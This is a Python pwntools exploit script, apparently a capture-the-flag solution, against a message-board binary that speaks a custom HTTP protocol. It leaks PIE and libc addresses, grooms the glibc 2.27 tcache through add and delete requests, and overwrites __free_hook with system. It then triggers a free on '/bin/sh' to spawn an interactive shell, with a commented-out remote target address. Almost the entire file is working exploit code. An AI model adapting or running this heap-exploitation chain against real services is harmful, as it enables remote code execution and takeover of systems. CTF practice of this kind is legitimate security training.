from pwn import*

context.log_level=True

elf=ELF('oooohMsgHTTP')

libc=ELF('libc-2.27.so')

#p = process(["./ld-2.27.so", "./oooohMsgHTTP"],env={"LD_PRELOAD":"./libc-2.27.so"})

p = process('./oooohMsgHTTP1',env={'LD_PRELOAD':'./libc-2.27.so'})

#p = process('./oooohMsgHTTP')

#p = remote('172.16.9.2',9002)


 

welcome='''POST /welcome HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=aaaaa;Messages=./flag\r\n\r\n'''

add_message='''POST /add_message HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=aaaaa;Messages=./flag\r\n\r\n'''

del_message='''POST /del_message HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=aaaaa;Messages=./flag\r\n\r\n'''

edit_message='''POST /edit_message HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=aaaaa;Messages=./flag\r\n\r\n'''

register_user='''POST /register_user HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=aaaaa;Messages=./flag\r\n\r\n'''

login_user='''POST /login_user HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=aaaaa;Messages=./flag\r\n\r\n'''

get_message='''POST /get_message HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=aaaaa;Messages=./flag\r\n\r\n'''

empty_message='''POST /empty_message HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=aaaaa;Messages=./flag\r\n\r\n'''

show_message='''POST /show_message HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=aaaaa;Messages=./flag\r\n\r\n'''

 

p.recvuntil('=========================    Server Start!    ===========================\n')

#############welcome

payload=welcome

 

p.sendline(payload)

 

p.recvuntil('Here is my gift: ')

leak=int(p.recv(14),16)

pie=leak-(0x555555555470-0x0000555555554000)

print hex(pie)

 

#############register_user

payload=register_user+"username=aa&password=bb"

 

p.sendline(payload)

 

############login_user

payload=login_user+"username=aa&password=bb"

p.sendline(payload)

 

def add(size,message='a'*0xf0):


	############add

	payload=add_message+"size="+str(size)+"&message="+message

	 

	p.sendline(payload)

	 

	p.recvuntil('{"secret":')

	secret=p.recvuntil(',"add',drop=True)

	print secret

	return secret

def dele(id):

 

	payload=del_message+"message_id="+str(id)

	 

	p.sendline(payload)

def edit(secret,message):
	payload=edit_message+"secret="+str(secret)+'&message='+str(message)
	p.sendline(payload)

for i in range(13):
	secret=add(0x90,'a'*0x90)

for i in range(13):
	dele(i)

for i in range(8):
	secret=add(0xf8,'a'*0xa8)

for i in range(7):
	dele(i)

#############register_user

payload=register_user+"username=aaa&password=bbb"
p.sendline(payload)

############login_user

payload=login_user+"username=aaa&password=bbb"
p.sendline(payload)

###get

print secret
payload=get_message+"secret="+str(secret)
p.sendline(payload)

###empty_message

payload=empty_message+"is_confirmed=yes"
p.sendline(payload)

###get

print secret
payload=get_message+"secret="+str(secret)
p.sendline(payload)


gdb.attach(p)
pause()

###show

print secret
payload=show_message
p.sendline(payload)
p.recvuntil('{"message":"')
leak=u64(p.recv(6).ljust(8,'\x00'))
print hex(leak)
libcbase=leak-(0x7ffff7dcdd50-0x00007ffff79e2000)
print hex(libcbase)
malloc=libcbase+libc.sym['__free_hook']

###################################################

 

for i in range(6):

	secret=add(0xf8,'a'*0x18)

 

for i in range(5):

	dele(i)

#############register_user

payload=register_user+"username=aaaa&password=bbbb"

 

p.sendline(payload)

 

############login_user

payload=login_user+"username=aaaa&password=bbbb"

p.sendline(payload)

###get

print secret

 

payload=get_message+"secret="+str(secret)

 

p.sendline(payload)

###empty_message

 

payload=empty_message+"is_confirmed=yes"

 

p.sendline(payload)

############login_user

payload=login_user+"username=aaa&password=bbb"

p.sendline(payload)

 

edit(secret,p64(malloc-0x10))

sec=add(0xf8,'a'*0x18)

print sec

system=libcbase+libc.sym['system']

payload=(p64(malloc)*8).ljust(0xf8,'a')

 

 

one=libcbase+0x10a45c

add(0xf8,p64(0x1111111122222222)*2+p64(system))

 

 

payload=login_user+"username=/bin/s&password=/bin/sh\x00"

p.sendline(payload)

 

#attach(p,'b *0x0000555555556162')

#pause()

 

 

'''

 

############login_user

payload=login_user+"username=aa&password=bb"

p.sendline(payload)

 

edit(secret,p64(pie+0x02050C8))

 

'''



p.interactive()